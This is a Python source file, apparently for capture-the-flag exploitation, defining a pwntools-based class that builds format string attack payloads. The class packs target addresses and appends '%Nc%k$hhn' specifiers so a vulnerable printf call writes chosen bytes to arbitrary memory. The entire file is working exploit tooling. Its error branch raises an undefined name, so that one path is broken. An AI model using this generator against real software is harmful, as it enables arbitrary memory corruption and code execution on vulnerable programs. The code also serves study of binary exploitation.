from pwn import *

class FSBGenerator:
	def __init__(self, pointer_offset: int, arch_bit: int) -> None:
		self.pointer_offset: int = pointer_offset
		self.addrs = []
		self.values = []
		self.arch_byte = arch_bit // 8
		if arch_bit == 32:
			self.pack = p32
		elif arch_bit == 64:
			self.pack = p64
		else:
			raise Error("No support this architecture.")
	def write(self, addr: int, content: int) -> None:
		for i, bi in enumerate(self.pack(content)):
			self.write1(addr + i, bi)
	def write1(self, addr: int, byte: int) -> None:
		self.addrs.append(addr)
		self.values.append(byte)
	def generate(self) -> str:
		payload = b""
		buf_size = 0
		for addr in self.addrs:
			payload += self.pack(addr)
			buf_size += self.arch_byte
		for value in self.values:
			if value >= buf_size:
				add_buf_size = value - buf_size
			else:
				add_buf_size = 0x100 + value - buf_size
			payload += f"%{add_buf_size}c%{self.pointer_offset}$hhn".encode()
			buf_size += add_buf_size
			buf_size %= 0x100
			self.pointer_offset += 1
		return payload


